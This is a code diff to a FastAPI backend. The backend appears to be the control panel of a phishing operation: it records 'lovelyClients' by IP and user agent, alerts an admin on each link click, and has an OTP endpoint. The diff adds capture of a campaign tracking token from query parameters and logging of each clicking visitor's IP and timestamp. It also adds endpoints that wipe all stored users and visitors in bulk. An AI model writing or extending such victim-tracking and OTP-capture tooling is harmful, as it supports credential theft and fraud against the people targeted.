@@ -20,6 +20,7 @@ from fastapi.middleware.cors import CORSMiddleware
 import requests
 import time
 from fastapi.security import APIKeyHeader
+from sqlalchemy import text as sa_text
 from utils import messageAdmin, CONFIG, DEBUG, xorString
 
 # import modules.auto_login
@@ -34,6 +35,23 @@ from starlette.middleware.base import BaseHTTPMiddleware
 api_key_header = APIKeyHeader(name="X-API-Key")
 
 models.Base.metadata.create_all(bind=engine)
+
+# Migrate new columns onto existing tables (SQLite ALTER TABLE)
+with engine.connect() as conn:
+    for table, column, col_type, default in [
+        ("lovelyClients", "tracking_param", "TEXT", "''"),
+        ("visitors", "ip", "TEXT", "''"),
+        ("visitors", "last_visit", "TEXT", "''"),
+    ]:
+        try:
+            conn.execute(
+                sa_text(
+                    f"ALTER TABLE {table} ADD COLUMN {column} {col_type} DEFAULT {default}"
+                )
+            )
+            conn.commit()
+        except Exception:
+            pass  # Column already exists
 
 if DEBUG:
     app = FastAPI()
@@ -147,7 +165,14 @@ async def create_lovelyclient(
         ip = request.client.host
     else:
         ip = ip_xforwarded
-    new_lovelyclient = models.User(id=id, ip=ip, user_agent=user_agent)
+    # Read the tracking token from query params (param name is configurable on the frontend)
+    tracking_value = ""
+    for key, val in request.query_params.items():
+        if val:
+            tracking_value = val
+            break
+    new_lovelyclient = models.User(id=id, ip=ip, user_agent=user_agent,
+                                   tracking_param=tracking_value)
     crud.create_user(db, new_lovelyclient)
     broadcast_msg = {"type": "new", "value": id}
     await manager.broadcast(json.dumps(broadcast_msg))
@@ -398,9 +423,15 @@ def set_visitor(
     id: str,
     request: Request,
     db: Session = Depends(get_db),
+    ip_xforwarded: str = Header(None, alias="X-Forwarded-For"),
 ):
     id = xorString(id)
-    crud.set_visitor(db, id)
+    if DEBUG:
+        visitor_ip = request.client.host
+    else:
+        visitor_ip = ip_xforwarded or ""
+    timestamp = str(int(time.time()))
+    crud.set_visitor(db, id, ip=visitor_ip, timestamp=timestamp)
     admin_message = f"----\n click from: {id} \n----"
 
     messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
@@ -419,6 +450,24 @@ def get_visitors(
 
     # return only with
     return db_visitors
+
+
+@app.delete("/users/all", dependencies=[Depends(get_api_key)])
+def delete_all_users(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    count = crud.delete_all_users(db)
+    return {"status": "OK", "deleted": count}
+
+
+@app.delete("/visitors/all", dependencies=[Depends(get_api_key)])
+def delete_all_visitors(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    count = crud.delete_all_visitors(db)
+    return {"status": "OK", "deleted": count}
 
 
 @app.get("/OTP/{id}")
